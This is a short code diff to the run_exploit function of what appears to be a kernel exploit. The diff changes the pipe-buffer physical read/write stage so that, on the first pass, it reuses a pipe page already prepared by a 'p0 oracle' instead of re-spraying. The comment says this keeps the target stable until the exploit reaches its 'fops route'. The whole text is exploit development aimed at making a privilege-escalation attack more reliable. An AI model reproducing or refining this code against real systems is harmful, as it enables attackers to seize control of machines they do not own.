@@ -230,9 +230,19 @@ int run_exploit(int argc, char **argv) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reset_pipe_attempt();
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  /*
+   * The physical p0 oracle already prepared a valid pipe page.  Releasing
+   * that state and immediately repeating the full spray makes this target
+   * unstable before the fops route is reached.  Reuse it on the normal
+   * first pass; forced retry passes still have to prepare a fresh set.
+   */
+  if (is_direct_ptr(pipebuf_page_base)) {
+    pr_info("reuse p0 physrw pipe page=%016zx\n", pipebuf_page_base);
+  } else {
+    reset_pipe_attempt();
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  }
   if (!is_direct_ptr(pipebuf_page_base)) {
     return 1;
   }
